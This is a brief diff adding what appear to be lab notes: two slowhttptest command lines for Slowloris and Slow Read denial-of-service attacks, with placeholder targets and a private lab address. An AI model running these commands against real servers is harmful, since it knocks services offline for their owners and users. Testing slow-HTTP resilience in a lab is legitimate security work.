@@ -1,0 +1,6 @@
+Slowloris 
+slowhttptest -H -g -o results -i <...> -c <...>  -r 250  -t GET -u <...>  -p 3 -l 300
+
+Slow Read - EXTRA
+slowhttptest -X -g -o output -c <...> -r 200 -w 512 -y 1024 -n <...> -z <...> -u http://192.168.56.x:y/Desktop/test.mp3 -p 3 -l 300
+
